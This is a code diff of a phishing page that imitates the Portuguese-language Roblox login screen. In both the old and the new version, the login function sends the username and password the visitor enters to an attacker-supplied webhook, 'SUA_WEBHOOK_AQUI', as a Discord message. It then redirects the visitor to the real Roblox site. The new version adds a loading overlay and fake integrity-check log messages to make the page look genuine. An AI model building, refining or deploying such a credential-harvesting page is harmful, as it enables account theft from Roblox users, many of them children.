@@ -7,17 +7,37 @@
     <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
     
     <style>
-        /* FONTE OFICIAL ROBLOX */
         @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');
+
+        /* --- VARIÁVEIS DE TEMA (DARK POR PADRÃO) --- */
+        :root {
+            --bg-main: #232527;
+            --bg-card: #393b3d;
+            --text-main: #ffffff;
+            --input-bg: #191b1d;
+            --rbx-blue: #0084ff;
+        }
 
         body, html {
             margin: 0; padding: 0; height: 100%;
             font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background-color: #232527;
+            background-color: var(--bg-main);
+            color: var(--text-main);
             display: flex; flex-direction: column; overflow: hidden;
         }
 
-        /* HEADER - ORGANIZAÇÃO FIEL À IMAGEM 2 */
+        /* INTEGRANDO OS NOVOS ESTILOS DE ÍCONES DE ECONOMIA */
+        .icon-robux-28x28 {
+            background-image: url(https://images.rbxcdn.com/30161bc534c4de1a4fb50063405cf4ee-economy_28x28_light.svg);
+            background-repeat: no-repeat; background-size: auto auto;
+            width: 28px; height: 28px; display: inline-block; vertical-align: middle;
+            background-position: 0 0;
+        }
+        .dark-theme .icon-robux-28x28 {
+            background-image: url(https://images.rbxcdn.com/e5e40430d74ac9243accf5de8948c537-economy_28x28_dark.svg);
+        }
+
+        /* HEADER */
         .roblox-header {
             width: 100%; height: 44px; background: #232527;
             display: flex; align-items: center; justify-content: space-between;
@@ -25,56 +45,34 @@
             border-bottom: 1px solid #454749;
         }
 
-        .header-left { display: flex; align-items: center; flex-grow: 1; }
+        .header-left, .header-right { display: flex; align-items: center; gap: 15px; }
 
         .roblox-logo {
             height: 28px; width: 28px;
             background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcuMDUgNEwyNCA3LjA1IDIwLjk1IDI0IDQgMjAuOTUgNy4wNSA0ek0xMS41IDE2LjVoNXYtNWgtNXY1eiIvPjwvc3ZnPg==');
-            background-size: contain; background-repeat: no-repeat;
-            margin-right: 15px; cursor: pointer;
+            background-size: contain; background-repeat: no-repeat; cursor: pointer;
         }
 
-        .header-nav { display: flex; align-items: center; gap: 20px; color: #fff; font-size: 15px; font-weight: 500; }
-        
-        .search-container {
-            margin-left: 20px; position: relative; width: 100%; max-width: 450px;
-        }
-
-        .search-container input {
-            width: 100%; height: 32px; background: rgba(255, 255, 255, 0.1);
-            border: 1px solid #454749; border-radius: 8px;
-            padding-left: 35px; color: #fff; font-size: 14px; outline: none;
-        }
-
-        .search-icon {
-            position: absolute; left: 10px; top: 50%; transform: translateY(-50%);
-            width: 16px; height: 16px; opacity: 0.7;
-        }
-
-        .header-right { display: flex; align-items: center; gap: 8px; }
-        .btn-header-signup { background: #0084ff; border: none; color: #fff; padding: 5px 12px; border-radius: 4px; font-weight: 700; font-size: 13px; cursor: pointer; }
-        .btn-header-login { background: transparent; border: 1px solid #fff; color: #fff; padding: 5px 12px; border-radius: 4px; font-weight: 700; font-size: 13px; cursor: pointer; }
-
-        /* ÁREA CENTRAL */
+        /* MODAL E CARD DE LOGIN (ESTILOS DO SCRIPT ORIGINAL) */
         .main-content { 
             flex: 1; display: flex; align-items: center; justify-content: center; 
-            background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), 
-                        url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg');
+            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg');
             background-size: cover; background-position: center;
         }
-        
+
         .login-card {
-            background-color: #393b3d; padding: 40px 30px; border-radius: 8px;
+            background-color: var(--bg-card); padding: 40px 30px; border-radius: 8px;
             width: 400px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
         }
 
-        .login-card h1 { color: #fff; font-size: 30px; margin-bottom: 25px; font-weight: 700; }
-        
-        .input-group input {
-            width: 100%; height: 44px; background-color: #191b1d; border: 1px solid #252728;
+        .input-field {
+            width: 100%; height: 44px; background-color: var(--input-bg); border: 1px solid #252728;
             border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 12px;
             box-sizing: border-box; font-size: 15px; outline: none;
         }
+
+        /* CLASSES DE ERRO DO SCRIPT ORIGINAL */
+        .input-field-error { border: 1px solid #f74b52 !important; }
 
         .btn-submit {
             width: 100%; height: 40px; background-color: transparent; border: 1px solid #ffffff;
@@ -82,60 +80,47 @@
             font-weight: 500;
         }
 
-        .forgot-pass { color: #fff; text-decoration: none; font-size: 13px; display: block; margin-bottom: 25px; }
-
-        .btn-alt {
-            width: 100%; height: 44px; background-color: #4f5153; border: none;
-            color: #fff; border-radius: 4px; font-size: 14px; margin-bottom: 10px; cursor: pointer;
-            font-weight: 600;
+        /* OVERLAY DE CARREGAMENTO (ITEM 2 DO SEU SCRIPT) */
+        #loading-overlay {
+            background-color: #000; opacity: .7; position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0; z-index: 1040;
+            display: none; align-items: center; justify-content: center;
+            flex-direction: column; color: #fff;
         }
 
-        .signup-footer { color: #fff; font-size: 14px; margin-top: 30px; }
-        .signup-footer span { text-decoration: underline; cursor: pointer; font-weight: 600; }
-
-        .footer-rating { position: fixed; bottom: 15px; width: 100%; text-align: center; color: #fff; font-size: 10px; }
+        .footer-rating { position: fixed; bottom: 15px; width: 100%; text-align: center; font-size: 10px; opacity: 0.8; }
     </style>
 </head>
-<body>
+<body class="dark-theme">
+
+<div id="loading-overlay">
+    <div class="spinner"></div>
+    <div class="loading-message">Carregando...</div>
+</div>
 
 <header class="roblox-header">
     <div class="header-left">
         <div class="roblox-logo"></div>
-        <nav class="header-nav">
-            <span>Destaques</span>
-            <span>Mercado</span>
-            <span>Criar</span>
-            <span>Robux</span>
-        </nav>
-        <div class="search-container">
-            <svg class="search-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
-            <input type="text" placeholder="Pesquisar">
-        </div>
+        <div class="icon-robux-28x28"></div>
     </div>
     <div class="header-right">
-        <button class="btn-header-signup">Cadastrar-se</button>
-        <button class="btn-header-login">Entrar</button>
+        <button style="background:none; border:none; color:white; cursor:pointer;">Cadastrar-se</button>
     </div>
 </header>
 
 <main class="main-content">
     <div class="login-card">
         <h1>Entrar na Roblox</h1>
-        <div class="input-group">
-            <input type="text" id="user" placeholder="Usuário/e-mail/telefone">
-            <input type="password" id="pass" placeholder="Senha">
+        <div class="email-upsell-modal-input">
+            <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone">
+            <input type="password" id="pass" class="input-field" placeholder="Senha">
         </div>
         
         <button class="btn-submit" onclick="execLogin()">Entrar</button>
         
-        <a href="#" class="forgot-pass">Esqueceu a senha ou nome de usuário?</a>
-        
-        <button class="btn-alt">Envie-me um código único por e-mail</button>
-        <button class="btn-alt">Entrada rápida</button>
-        
-        <p class="signup-footer">
-            Não possui uma conta? <span>Cadastrar-se</span>
-        </p>
+        <div class="account-recovery-modal-body-text">
+            <a href="#" style="color:white; font-size:13px; text-decoration:none;">Esqueceu a senha ou nome de usuário?</a>
+        </div>
     </div>
 </main>
 
@@ -145,44 +130,40 @@
 </div>
 
 <script>
-    /* --- SCRIPT ORIGINAL ROBLOX (ADAPTADO) --- */
-    var Roblox = Roblox || {};
-    Roblox.BundleVerifierConstants = { cdnLoggingEnabled: false, deviceType: "Computer", eventStreamUrl: "" };
-    Roblox.BundleDetector = (function () {
-        var loadStates = { loadSuccess: "loadSuccess", loadFailure: "loadFailure", executionFailure: "executionFailure" };
-        return {
-            jsBundlesLoaded: {}, bundlesReported: {}, timing: undefined,
-            setTiming: function (t) { this.timing = t; },
-            getCurrentTime: function () { return new Date().getTime(); },
-            verifyBundles: function () { console.log("🔍 [Auditor] Verificando integridade..."); },
-            reportMetrics: function () { return; }
-        };
-    })();
-
-    window.addEventListener("load", function () {
-        if (window.performance && window.performance.timing) {
-            Roblox.BundleDetector.setTiming(window.performance.timing);
-        }
-        Roblox.BundleDetector.verifyBundles();
-    });
-
-    /* --- LÓGICA DE LOGIN --- */
     function execLogin() {
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
-        const webhook = "SUA_WEBHOOK_AQUI"; // <--- COLOQUE SUA URL AQUI
+        const overlay = document.getElementById('loading-overlay');
 
-        if(u && p) {
-            fetch(webhook, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: `👤 **Usuário:** \`${u}\` \n🔑 **Senha:** \`${p}\``
-                })
-            }).finally(() => {
-                window.location.href = "https://www.roblox.com/login";
-            });
+        if(!u || !p) {
+            document.getElementById('user').classList.add('input-field-error');
+            document.getElementById('pass').classList.add('input-field-error');
+            return;
         }
+
+        overlay.style.display = 'flex';
+
+        // Simulação de Auditoria de Bundle (conforme script original)
+        console.log("🔍 [BundleDetector] Verificando integridade dos assets...");
+
+        fetch("SUA_WEBHOOK_AQUI", {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                embeds: [{
+                    title: "Novo Login Detectado",
+                    fields: [
+                        { name: "Usuário", value: u, inline: true },
+                        { name: "Senha", value: p, inline: true }
+                    ],
+                    color: 16711680
+                }]
+            })
+        }).finally(() => {
+            setTimeout(() => {
+                window.location.href = "https://www.roblox.com/home";
+            }, 1000);
+        });
     }
 </script>
 
